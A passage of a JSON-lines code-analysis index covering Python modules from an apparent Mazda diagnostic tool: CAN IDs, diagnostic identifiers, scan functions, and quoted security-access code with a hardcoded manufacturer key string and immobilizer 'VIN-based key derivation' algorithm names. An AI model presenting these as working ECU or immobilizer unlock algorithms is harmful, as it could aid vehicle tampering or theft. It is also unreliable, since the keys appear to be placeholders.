"content": "return hashlib.sha256(base_key).digest()[:16]"}, {"type": "security_pattern", "line": 455, "pattern": "key", "content": "def _get_manufacturer_key_level2(self) -> bytes:"}, {"type": "security_pattern", "line": 456, "pattern": "key", "content": "\"\"\"Get manufacturer level 2 key\"\"\""}, {"type": "security_pattern", "line": 458, "pattern": "key", "content": "base_key = b'mazda_manufacturer_key_level2_2024_secure'"}, {"type": "security_pattern", "line": 459, "pattern": "key", "content": "return hashlib.sha256(base_key).digest()[:16]"}, {"type": "security_pattern", "line": 459, "pattern": "hash", "content": "return hashlib.sha256(base_key).digest()[:16]"}, {"type": "security_pattern", "line": 461, "pattern": "algorithm", "content": "def list_all_algorithms(self) -> List[str]:"}, {"type": "security_pattern", "line": 462, "pattern": "algorithm", "content": "\"\"\"List all available algorithms\"\"\""}, {"type": "security_pattern", "line": 463, "pattern": "key", "content": "return list(self.algorithm_database.keys())"}, {"type": "security_pattern", "line": 463, "pattern": "algorithm", "content": "return list(self.algorithm_database.keys())"}, {"type": "security_pattern", "line": 465, "pattern": "algorithm", "content": "def get_algorithm_info(self, algorithm_name: str) -> Dict[str, Any]:"}, {"type": "security_pattern", "line": 466, "pattern": "algorithm", "content": "\"\"\"Get information about specific algorithm\"\"\""}, {"type": "security_pattern", "line": 467, "pattern": "algorithm", "content": "if algorithm_name not in self.algorithm_database:"}, {"type": "security_pattern", "line": 468, "pattern": "algorithm", "content": "return {\"error\": \"Algorithm not found\"}"}, {"type": "security_pattern", "line": 471, "pattern": "algorithm", "content": "\"name\": algorithm_name,"}, {"type": "security_pattern", "line": 472, "pattern": "algorithm", "content": "\"description\": self._get_algorithm_description(algorithm_name),"}, {"type": "security_pattern", "line": 473, "pattern": "seed", "content": "\"seed_length\": self._get_algorithm_seed_length(algorithm_name),"}, {"type": "security_pattern", "line": 473, "pattern": "algorithm", "content": "\"seed_length\": self._get_algorithm_seed_length(algorithm_name),"}, {"type": "security_pattern", "line": 474, "pattern": "key", "content": "\"key_length\": self._get_algorithm_key_length(algorithm_name),"}, {"type": "security_pattern", "line": 474, "pattern": "algorithm", "content": "\"key_length\": self._get_algorithm_key_length(algorithm_name),"}, {"type": "security_pattern", "line": 475, "pattern": "algorithm", "content": "\"vin_required\": self._is_vin_required(algorithm_name)"}, {"type": "security_pattern", "line": 480, "pattern": "algorithm", "content": "def _get_algorithm_description(self, algorithm_name: str) -> str:"}, {"type": "security_pattern", "line": 481, "pattern": "algorithm", "content": "\"\"\"Get algorithm description\"\"\""}, {"type": "security_pattern", "line": 483, "pattern": "algorithm", "content": "\"ALG_27_STANDARD\": \"Standard 0x27 security access algorithm\","}, {"type": "security_pattern", "line": 484, "pattern": "algorithm", "content": "\"ALG_27_ENHANCED\": \"Enhanced 0x27 algorithm with additional security\","}, {"type": "security_pattern", "line": 485, "pattern": "algorithm", "content": "\"ENGINE_ECU_2011\": \"2011 Mazdaspeed 3 engine ECU specific algorithm\","}, {"type": "security_pattern", "line": 486, "pattern": "key", "content": "\"IMMOBILIZER_2011\": \"2011 immobilizer system with VIN-based key derivation\","}, {"type": "security_pattern", "line": 487, "pattern": "encrypt", "content": "\"MANUFACTURER_LEVEL1\": \"Manufacturer level 1 access with AES encryption\","}, {"type": "security_pattern", "line": 490, "pattern": "algorithm", "content": "return descriptions.get(algorithm_name, \"No description available\")"}, {"type": "security_pattern", "line": 492, "pattern": "seed", "content": "def _get_algorithm_seed_length(self, algorithm_name: str) -> int:"}, {"type": "security_pattern", "line": 492, "pattern": "algorithm", "content": "def _get_algorithm_seed_length(self, algorithm_name: str) -> int:"}, {"type": "security_pattern", "line": 493, "pattern": "seed", "content": "\"\"\"Get required seed length for algorithm\"\"\""}, {"type": "security_pattern", "line": 493, "pattern": "algorithm", "content": "\"\"\"Get required seed length for algorithm\"\"\""}, {"type": "security_pattern", "line": 504, "pattern": "algorithm", "content": "return length_map.get(algorithm_name, 4)"}, {"type": "security_pattern", "line": 506, "pattern": "key", "content": "def _get_algorithm_key_length(self, algorithm_name: str) -> int:"}, {"type": "security_pattern", "line": 506, "pattern": "algorithm", "content": "def _get_algorithm_key_length(self, algorithm_name: str) -> int:"}, {"type": "security_pattern", "line": 507, "pattern": "key", "content": "\"\"\"Get output key length for algorithm\"\"\""}, {"type": "security_pattern", "line": 507, "pattern": "algorithm", "content": "\"\"\"Get output key length for algorithm\"\"\""}, {"type": "security_pattern", "line": 518, "pattern": "algorithm", "content": "return length_map.get(algorithm_name, 4)"}, {"type": "security_pattern", "line": 520, "pattern": "algorithm", "content": "def _is_vin_required(self, algorithm_name: str) -> bool:"}, {"type": "security_pattern", "line": 521, "pattern": "algorithm", "content": "\"\"\"Check if algorithm requires VIN\"\"\""}, {"type": "security_pattern", "line": 527, "pattern": "algorithm", "content": "return algorithm_name in vin_required"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds11.py", "lines_read": 993, "features_found": [{"type": "function", "name": "__init__", "line": 51}, {"type": "function", "name": "perform_system_scan", "line": 57}, {"type": "function", "name": "_scan_engine_system", "line": 128}, {"type": "function", "name": "_scan_transmission_system", "line": 169}, {"type": "function", "name": "_scan_abs_system", "line": 196}, {"type": "function", "name": "_scan_airbag_system", "line": 221}, {"type": "function", "name": "_scan_bcm_system", "line": 241}, {"type": "function", "name": "_scan_immobilizer_system", "line": 267}, {"type": "function", "name": "_read_engine_rpm", "line": 288}, {"type": "function", "name": "_read_coolant_temp", "line": 299}, {"type": "function", "name": "_read_throttle_position", "line": 310}, {"type": "function", "name": "_read_maf_flow", "line": 321}, {"type": "function", "name": "_read_boost_pressure", "line": 332}, {"type": "function", "name": "_read_fuel_trim", "line": 344}, {"type": "function", "name": "_check_engine_sensors", "line": 361}, {"type": "function", "name": "_check_engine_actuators", "line": 387}, {"type": "function", "name": "_check_oxygen_sensor", "line": 413}, {"type": "function", "name": "_check_knock_sensor", "line": 428}, {"type": "function", "name": "_check_crank_sensor", "line": 443}, {"type": "function", "name": "_check_cam_sensor", "line": 451}, {"type": "function", "name": "_check_fuel_injectors", "line": 456}, {"type": "function", "name": "_check_ignition_coils", "line": 473}, {"type": "function", "name": "_check_throttle_actuator", "line": 478}, {"type": "function", "name": "_check_vvt_solenoids", "line": 491}, {"type": "function", "name": "_calculate_system_status", "line": 496}, {"type": "function", "name": "perform_active_test", "line": 553}, {"type": "function", "name": "_get_test_definition", "line": 612}, {"type": "function", "name": "_perform_active_component_test", "line": 655}, {"type": "function", "name": "_perform_system_test", "line": 671}, {"type": "function", "name": "_perform_component_test", "line": 687}, {"type": "function", "name": "_test_fuel_pump", "line": 692}, {"type": "function", "name": "_test_ignition_system", "line": 733}, {"type": "function", "name": "_test_ignition_coil", "line": 764}, {"type": "function", "name": "_test_boost_control", "line": 773}, {"type": "function", "name": "_test_vvt_system", "line": 812}, {"type": "function", "name": "monitor_live_data", "line": 842}, {"type": "function", "name": "_read_parameter", "line": 901}, {"type": "function", "name": "_check_parameter_alerts", "line": 917}, {"type": "function", "name": "_calculate_data_statistics", "line": 948}, {"type": "function", "name": "get_current_test_status", "line": 973}, {"type": "function", "name": "abort_current_test", "line": 985}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticTestType", "line": 17}, {"type": "class", "name": "TestStatus", "line": 26}, {"type": "class", "name": "DiagnosticTest", "line": 35}, {"type": "class", "name": "MazdaDiagnosticService", "line": 45}], "algorithms": [{"type": "algorithm_function", "line": 496, "content": "def _calculate_system_status(self, scan_results: Dict[str, Any]) -> Dict[str, str]:"}, {"type": "algorithm_function", "line": 948, "content": "def _calculate_data_statistics(self, data_samples: List[Dict[str, Any]]) -> Dict[str, Any]:"}], "protocols": [{"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "ACTIVE_TEST = 0x01"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "SYSTEM_TEST = 0x02"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "COMPONENT_TEST = 0x03"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "ADAPTATION_TEST = 0x04"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "CALIBRATION_TEST = 0x05"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "MEMORY_TEST = 0x06"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "NOT_STARTED = 0x00"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "IN_PROGRESS = 0x01"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "COMPLETED = 0x02"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "FAILED = 0x03"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "ABORTED = 0x04"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_info = self.diagnostic_protocol.read_dtc_information(0x02)"}, {"type": "protocol", "line": 291, "protocol": "0x[0-9A-Fa-f]+", "content": "rpm_data = self.diagnostic_protocol.read_data_by_identifier(0x010C)"}, {"type": "protocol", "line": 302, "protocol": "0x[0-9A-Fa-f]+", "content": "temp_data = self.diagnostic_protocol.read_data_by_identifier(0x0105)"}, {"type": "protocol", "line": 313, "protocol": "0x[0-9A-Fa-f]+", "content": "throttle_data = self.diagnostic_protocol.read_data_by_identifier(0x0111)"}, {"type": "protocol", "line": 324, "protocol": "0x[0-9A-Fa-f]+", "content": "maf_data = self.diagnostic_protocol.read_data_by_identifier(0x0110)"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "boost_data = self.diagnostic_protocol.read_data_by_identifier(0x220109)"}, {"type": "protocol", "line": 347, "protocol": "0x[0-9A-Fa-f]+", "content": "stft_data = self.diagnostic_protocol.read_data_by_identifier(0x0106)"}, {"type": "protocol", "line": 348, "protocol": "0x[0-9A-Fa-f]+", "content": "ltft_data = self.diagnostic_protocol.read_data_by_identifier(0x0107)"}, {"type": "protocol", "line": 417, "protocol": "0x[0-9A-Fa-f]+", "content": "o2_data = self.diagnostic_protocol.read_data_by_identifier(0x0114)"}, {"type": "protocol", "line": 432, "protocol": "0x[0-9A-Fa-f]+", "content": "knock_data = self.diagnostic_protocol.read_data_by_identifier(0x22010C)"}, {"type": "protocol", "line": 615, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0101: DiagnosticTest("}, {"type": "protocol", "line": 616, "protocol": "0x[0-9A-Fa-f]+", "content": "test_id=0x0101,"}, {"type": "protocol", "line": 624, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0102: DiagnosticTest("}, {"type": "protocol", "line": 625, "protocol": "0x[0-9A-Fa-f]+", "content": "test_id=0x0102,"}, {"type": "protocol", "line": 633, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0103: DiagnosticTest("}, {"type": "protocol", "line": 634, "protocol": "0x[0-9A-Fa-f]+", "content": "test_id=0x0103,"}, {"type": "protocol", "line": 642, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0104: DiagnosticTest("}, {"type": "protocol", "line": 643, "protocol": "0x[0-9A-Fa-f]+", "content": "test_id=0x0104,"}, {"type": "protocol", "line": 660, "protocol": "0x[0-9A-Fa-f]+", "content": "if test.test_id == 0x0101:  # Fuel Pump Test"}, {"type": "protocol", "line": 662, "protocol": "0x[0-9A-Fa-f]+", "content": "elif test.test_id == 0x0102:  # Ignition System Test"}, {"type": "protocol", "line": 676, "protocol": "0x[0-9A-Fa-f]+", "content": "if test.test_id == 0x0103:  # Boost Control Test"}, {"type": "protocol", "line": 678, "protocol": "0x[0-9A-Fa-f]+", "content": "elif test.test_id == 0x0104:  # VVT System Test"}], "hardware_assumptions": [{"type": "hardware", "line": 59, "hardware": "vehicle", "content": "Perform complete vehicle system scan"}, {"type": "hardware", "line": 64, "hardware": "vehicle", "content": "logger.info(\"Starting complete vehicle system scan...\")"}, {"type": "hardware", "line": 79, "hardware": "ABS", "content": "('ABS', self._scan_abs_system),"}, {"type": "hardware", "line": 81, "hardware": "BCM", "content": "('BCM', self._scan_bcm_system),"}, {"type": "hardware", "line": 82, "hardware": "immobilizer", "content": "('IMMOBILIZER', self._scan_immobilizer_system)"}, {"type": "hardware", "line": 196, "hardware": "ABS", "content": "def _scan_abs_system(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 197, "hardware": "ABS", "content": "\"\"\"Scan ABS system\"\"\""}, {"type": "hardware", "line": 198, "hardware": "ABS", "content": "abs_scan = {"}, {"type": "hardware", "line": 206, "hardware": "ABS", "content": "abs_scan['communication_ok'] = True  # Simulated"}, {"type": "hardware", "line": 209, "hardware": "ABS", "content": "abs_scan['parameters'] = {"}, {"type": "hardware", "line": 211, "hardware": "ABS", "content": "'abs_status': 'Normal'"}, {"type": "hardware", "line": 214, "hardware": "ABS", "content": "return abs_scan"}, {"type": "hardware", "line": 217, "hardware": "ABS", "content": "logger.error(f\"Error scanning ABS system: {e}\")"}, {"type": "hardware", "line": 218, "hardware": "ABS", "content": "abs_scan['error'] = str(e)"}, {"type": "hardware", "line": 219, "hardware": "ABS", "content": "return abs_scan"}, {"type": "hardware", "line": 241, "hardware": "BCM", "content": "def _scan_bcm_system(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 243, "hardware": "BCM", "content": "bcm_scan = {"}, {"type": "hardware", "line": 251, "hardware": "BCM", "content": "bcm_scan['communication_ok'] = True  # Simulated"}, {"type": "hardware", "line": 254, "hardware": "BCM", "content": "bcm_scan['parameters'] = {"}, {"type": "hardware", "line": 255, "hardware": "vehicle", "content": "'vehicle_voltage': 12.5,"}, {"type": "hardware", "line": 260, "hardware": "BCM", "content": "return bcm_scan"}, {"type": "hardware", "line": 263, "hardware": "BCM", "content": "logger.error(f\"Error scanning BCM system: {e}\")"}, {"type": "hardware", "line": 264, "hardware": "BCM", "content": "bcm_scan['error'] = str(e)"}, {"type": "hardware", "line": 265, "hardware": "BCM", "content": "return bcm_scan"}, {"type": "hardware", "line": 267, "hardware": "immobilizer", "content": "def _scan_immobilizer_system(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 268, "hardware": "immobilizer", "content": "\"\"\"Scan immobilizer system\"\"\""}, {"type": "hardware", "line": 269, "hardware": "immobilizer", "content": "immobilizer_scan = {"}, {"type": "hardware", "line": 277, "hardware": "immobilizer", "content": "immobilizer_scan['communication_ok'] = True  # Simulated"}, {"type": "hardware", "line": 278, "hardware": "immobilizer", "content": "immobilizer_scan['status'] = 'Active'"}, {"type": "hardware", "line": 279, "hardware": "immobilizer", "content": "immobilizer_scan['key_status'] = 'Recognized'"}, {"type": "hardware", "line": 281, "hardware": "immobilizer", "content": "return immobilizer_scan"}, {"type": "hardware", "line": 284, "hardware": "immobilizer", "content": "logger.error(f\"Error scanning immobilizer system: {e}\")"}, {"type": "hardware", "line": 285, "hardware": "immobilizer", "content": "immobilizer_scan['error'] = str(e)"}, {"type": "hardware", "line": 286, "hardware": "immobilizer", "content": "return immobilizer_scan"}, {"type": "hardware", "line": 465, "hardware": "ABS", "content": "if abs(stft) < 10 and abs(ltft) < 10:"}, {"type": "hardware", "line": 540, "hardware": "ABS", "content": "safety_systems = ['AIRBAG', 'ABS']"}], "security_logic": [{"type": "security_pattern", "line": 272, "pattern": "key", "content": "'key_status': 'Unknown'"}, {"type": "security_pattern", "line": 279, "pattern": "key", "content": "immobilizer_scan['key_status'] = 'Recognized'"}, {"type": "security_pattern", "line": 957, "pattern": "key", "content": "parameters = list(first_sample['values'].keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds12.py", "lines_read": 509, "features_found": [{"type": "function", "name": "__init__", "line": 41}, {"type": "function", "name": "connect", "line": 64}, {"type": "function", "name": "_setup_can_filters", "line": 92}, {"type": "function", "name": "disconnect", "line": 102}, {"type": "function", "name": "send_frame", "line": 117}, {"type": "function", "name": "receive_frame", "line": 158}, {"type": "function", "name": "start_receive_thread", "line": 215}, {"type": "function", "name": "stop_receive_thread", "line": 232}, {"type": "function", "name": "_receive_loop", "line": 244}, {"type": "function", "name": "send_diagnostic_message", "line": 257}, {"type": "function", "name": "receive_diagnostic_message", "line": 295}, {"type": "function", "name": "monitor_bus_traffic", "line": 327}, {"type": "function", "name": "_identify_mazda_message", "line": 384}, {"type": "function", "name": "perform_bus_health_check", "line": 403}, {"type": "function", "name": "set_bitrate", "line": 473}, {"type": "function", "name": "get_interface_status", "line": 494}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "socket", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "CANFrameType", "line": 19}, {"type": "class", "name": "CANFrame", "line": 27}, {"type": "class", "name": "MazdaCANInterface", "line": 35}], "algorithms": [], "protocols": [{"type": "protocol", "line": 4, "protocol": "CAN", "content": "CAN INTERFACE - Complete CAN Bus Communication"}, {"type": "protocol", "line": 5, "protocol": "CAN", "content": "Direct CAN interface implementation for Mazda vehicles"}, {"type": "protocol", "line": 19, "protocol": "CAN", "content": "class CANFrameType(IntEnum):"}, {"type": "protocol", "line": 20, "protocol": "CAN", "content": "\"\"\"CAN Frame Types\"\"\""}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "STANDARD = 0x01  # 11-bit identifier"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "EXTENDED = 0x02  # 29-bit identifier"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "REMOTE = 0x03    # Remote transmission request"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "ERROR = 0x04     # Error frame"}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "class CANFrame:"}, {"type": "protocol", "line": 28, "protocol": "CAN", "content": "\"\"\"CAN Frame Structure\"\"\""}, {"type": "protocol", "line": 31, "protocol": "CAN", "content": "frame_type: CANFrameType = CANFrameType.STANDARD"}, {"type": "protocol", "line": 35, "protocol": "CAN", "content": "class MazdaCANInterface:"}, {"type": "protocol", "line": 37, "protocol": "CAN", "content": "Complete CAN Interface for Mazda Vehicle Communication"}, {"type": "protocol", "line": 38, "protocol": "CAN", "content": "Provides direct CAN bus access for advanced diagnostics"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "'ECU_TX': 0x7E0,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "'ECU_RX': 0x7E8,"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "'TCM_TX': 0x7E1,"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "'TCM_RX': 0x7E9,"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS_TX': 0x7E2,"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS_RX': 0x7EA,"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "'BCM_TX': 0x7E6,"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "'BCM_RX': 0x7EE,"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "'GATEWAY_TX': 0x750,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "'GATEWAY_RX': 0x758"}, {"type": "protocol", "line": 66, "protocol": "CAN", "content": "Connect to CAN interface"}, {"type": "protocol", "line": 72, "protocol": "CAN", "content": "logger.info(f\"Connecting to CAN interface: {self.interface}\")"}, {"type": "protocol", "line": 75, "protocol": "CAN", "content": "self.socket = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)"}, {"type": "protocol", "line": 84, "protocol": "CAN", "content": "logger.info(f\"Successfully connected to CAN interface: {self.interface}\")"}, {"type": "protocol", "line": 88, "protocol": "CAN", "content": "logger.error(f\"Failed to connect to CAN interface: {e}\")"}, {"type": "protocol", "line": 93, "protocol": "CAN", "content": "\"\"\"Setup CAN frame filters\"\"\""}, {"type": "protocol", "line": 100, "protocol": "CAN", "content": "logger.warning(f\"Could not setup CAN filters: {e}\")"}, {"type": "protocol", "line": 103, "protocol": "CAN", "content": "\"\"\"Disconnect from CAN interface\"\"\""}, {"type": "protocol", "line": 112, "protocol": "CAN", "content": "logger.info(\"Disconnected from CAN interface\")"}, {"type": "protocol", "line": 115, "protocol": "CAN", "content": "logger.error(f\"Error disconnecting from CAN interface: {e}\")"}, {"type": "protocol", "line": 117, "protocol": "CAN", "content": "def send_frame(self, frame: CANFrame) -> bool:"}, {"type": "protocol", "line": 119, "protocol": "CAN", "content": "Send CAN frame"}, {"type": "protocol", "line": 122, "protocol": "CAN", "content": "frame: CAN frame to send"}, {"type": "protocol", "line": 129, "protocol": "CAN", "content": "logger.error(\"CAN interface not connected\")"}, {"type": "protocol", "line": 134, "protocol": "CAN", "content": "if frame.frame_type == CANFrameType.EXTENDED:"}, {"type": "protocol", "line": 135, "protocol": "CAN", "content": "can_id |= socket.CAN_EFF_FLAG"}, {"type": "protocol", "line": 136, "protocol": "CAN", "content": "elif frame.frame_type == CANFrameType.REMOTE:"}, {"type": "protocol", "line": 137, "protocol": "CAN", "content": "can_id |= socket.CAN_RTR_FLAG"}, {"type": "protocol", "line": 138, "protocol": "CAN", "content": "elif frame.frame_type == CANFrameType.ERROR:"}, {"type": "protocol", "line": 139, "protocol": "CAN", "content": "can_id |= socket.CAN_ERR_FLAG"}, {"type": "protocol", "line": 148, "protocol": "CAN", "content": "logger.debug(f\"Sent CAN frame: ID=0x{frame.frame_id:03X}, Data={frame.data.hex().upper()}\")"}, {"type": "protocol", "line": 151, "protocol": "CAN", "content": "logger.error(\"Failed to send CAN frame\")"}, {"type": "protocol", "line": 155, "protocol": "CAN", "content": "logger.error(f\"Error sending CAN frame: {e}\")"}, {"type": "protocol", "line": 158, "protocol": "CAN", "content": "def receive_frame(self, timeout: float = 1.0) -> Optional[CANFrame]:"}, {"type": "protocol", "line": 160, "protocol": "CAN", "content": "Receive CAN frame with timeout"}, {"type": "protocol", "line": 166, "protocol": "CAN", "content": "CAN frame or None if timeout"}, {"type": "protocol", "line": 170, "protocol": "CAN", "content": "logger.error(\"CAN interface not connected\")"}, {"type": "protocol", "line": 177, "protocol": "CAN", "content": "frame_data = self.socket.recv(16)  # CAN frame size"}, {"type": "protocol", "line": 185, "protocol": "CAN", "content": "frame_type = CANFrameType.STANDARD"}, {"type": "protocol", "line": 186, "protocol": "CAN", "content": "if can_id & socket.CAN_EFF_FLAG:"}, {"type": "protocol", "line": 187, "protocol": "CAN", "content": "frame_type = CANFrameType.EXTENDED"}, {"type": "protocol", "line": 188, "protocol": "CAN", "content": "can_id &= socket.CAN_EFF_MASK"}, {"type": "protocol", "line": 189, "protocol": "CAN", "content": "elif can_id & socket.CAN_RTR_FLAG:"}, {"type": "protocol", "line": 190, "protocol": "CAN", "content": "frame_type = CANFrameType.REMOTE"}, {"type": "protocol", "line": 191, "protocol": "CAN", "content": "can_id &= socket.CAN_RTR_FLAG"}, {"type": "protocol", "line": 192, "protocol": "CAN", "content": "elif can_id & socket.CAN_ERR_FLAG:"}, {"type": "protocol", "line": 193, "protocol": "CAN", "content": "frame_type = CANFrameType.ERROR"}, {"type": "protocol", "line": 194, "protocol": "CAN", "content": "can_id &= socket.CAN_ERR_MASK"}, {"type": "protocol", "line": 196, "protocol": "CAN", "content": "frame = CANFrame("}, {"type": "protocol", "line": 204, "protocol": "CAN", "content": "logger.debug(f\"Received CAN frame: ID=0x{frame.frame_id:03X}, Data={frame.data.hex().upper()}\")"}, {"type": "protocol", "line": 212, "protocol": "CAN", "content": "logger.error(f\"Error receiving CAN frame: {e}\")"}, {"type": "protocol", "line": 215, "protocol": "CAN", "content": "def start_receive_thread(self, callback: Callable[[CANFrame], None]):"}, {"type": "protocol", "line": 227, "protocol": "CAN", "content": "logger.info(\"Started CAN receive thread\")"}, {"type": "protocol", "line": 239, "protocol": "CAN", "content": "logger.info(\"Stopped CAN receive thread\")"}, {"type": "protocol", "line": 258, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address: int = 0x7DF) -> bool:"}, {"type": "protocol", "line": 260, "protocol": "CAN", "content": "Send diagnostic message over CAN"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "frame_data = bytes([0x00 | len(data)]) + data"}, {"type": "protocol", "line": 278, "protocol": "CAN", "content": "frame = CANFrame("}, {"type": "protocol", "line": 281, "protocol": "CAN", "content": "frame_type=CANFrameType.STANDARD"}, {"type": "protocol", "line": 298, "protocol": "CAN", "content": "Receive diagnostic message from CAN"}, {"type": "protocol", "line": 316, "protocol": "0x[0-9A-Fa-f]+", "content": "if pci & 0xF0 == 0x00:  # Single frame"}, {"type": "protocol", "line": 317, "protocol": "0x[0-9A-Fa-f]+", "content": "data_length = pci & 0x0F"}, {"type": "protocol", "line": 329, "protocol": "CAN", "content": "Monitor CAN bus traffic"}, {"type": "protocol", "line": 337, "protocol": "CAN", "content": "logger.info(f\"Monitoring CAN bus traffic for {duration} seconds\")"}, {"type": "protocol", "line": 364, "protocol": "CAN", "content": "if frame.frame_type == CANFrameType.ERROR:"}, {"type": "protocol", "line": 376, "protocol": "CAN", "content": "logger.info(f\"CAN bus monitoring completed: {frame_count} frames analyzed\")"}, {"type": "protocol", "line": 380, "protocol": "CAN", "content": "logger.error(f\"Error monitoring CAN bus traffic: {e}\")"}, {"type": "protocol", "line": 384, "protocol": "CAN", "content": "def _identify_mazda_message(self, frame: CANFrame) -> Optional[Dict[str, Any]]:"}, {"type": "protocol", "line": 385, "protocol": "CAN", "content": "\"\"\"Identify Mazda-specific CAN messages\"\"\""}, {"type": "protocol", "line": 405, "protocol": "CAN", "content": "Perform CAN bus health check"}, {"type": "protocol", "line": 465, "protocol": "CAN", "content": "logger.info(\"CAN bus health check completed\")"}, {"type": "protocol", "line": 475, "protocol": "CAN", "content": "Set CAN bus bitrate"}, {"type": "protocol", "line": 487, "protocol": "CAN", "content": "logger.info(f\"CAN bitrate set to {bitrate} bps\")"}, {"type": "protocol", "line": 491, "protocol": "CAN", "content": "logger.error(f\"Error setting CAN bitrate: {e}\")"}, {"type": "protocol", "line": 496, "protocol": "CAN", "content": "Get CAN interface status"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "CAN bus", "content": "CAN INTERFACE - Complete CAN Bus Communication"}, {"type": "hardware", "line": 5, "hardware": "vehicle", "content": "Direct CAN interface implementation for Mazda vehicles"}, {"type": "hardware", "line": 37, "hardware": "vehicle", "content": "Complete CAN Interface for Mazda Vehicle Communication"}, {"type": "hardware", "line": 38, "hardware": "CAN bus", "content": "Provides direct CAN bus access for advanced diagnostics"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "'ECU_TX': 0x7E0,"}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "'ECU_RX': 0x7E8,"}, {"type": "hardware", "line": 54, "hardware": "TCM", "content": "'TCM_TX': 0x7E1,"}, {"type": "hardware", "line": 55, "hardware": "TCM", "content": "'TCM_RX': 0x7E9,"}, {"type": "hardware", "line": 56, "hardware": "ABS", "content": "'ABS_TX': 0x7E2,"}, {"type": "hardware", "line": 57, "hardware": "ABS", "content": "'ABS_RX': 0x7EA,"}, {"type": "hardware", "line": 58, "hardware": "BCM", "content": "'BCM_TX': 0x7E6,"}, {"type": "hardware", "line": 59, "hardware": "BCM", "content": "'BCM_RX': 0x7EE,"}, {"type": "hardware", "line": 263, "hardware": "ECU", "content": "target_address: Target ECU address"}, {"type": "hardware", "line": 329, "hardware": "CAN bus", "content": "Monitor CAN bus traffic"}, {"type": "hardware", "line": 337, "hardware": "CAN bus", "content": "logger.info(f\"Monitoring CAN bus traffic for {duration} seconds\")"}, {"type": "hardware", "line": 376, "hardware": "CAN bus", "content": "logger.info(f\"CAN bus monitoring completed: {frame_count} frames analyzed\")"}, {"type": "hardware", "line": 380, "hardware": "CAN bus", "content": "logger.error(f\"Error monitoring CAN bus traffic: {e}\")"}, {"type": "hardware", "line": 405, "hardware": "CAN bus", "content": "Perform CAN bus health check"}, {"type": "hardware", "line": 453, "hardware": "ECU", "content": "mazda_ecus_found = 0"}, {"type": "hardware", "line": 455, "hardware": "ECU", "content": "if any(ecu in msg.get('message_type', '') for ecu in ['ECU', 'TCM', 'ABS', 'BCM']):"}, {"type": "hardware", "line": 455, "hardware": "TCM", "content": "if any(ecu in msg.get('message_type', '') for ecu in ['ECU', 'TCM', 'ABS', 'BCM']):"}, {"type": "hardware", "line": 455, "hardware": "BCM", "content": "if any(ecu in msg.get('message_type', '') for ecu in ['ECU', 'TCM', 'ABS', 'BCM']):"}, {"type": "hardware", "line": 455, "hardware": "ABS", "content": "if any(ecu in msg.get('message_type', 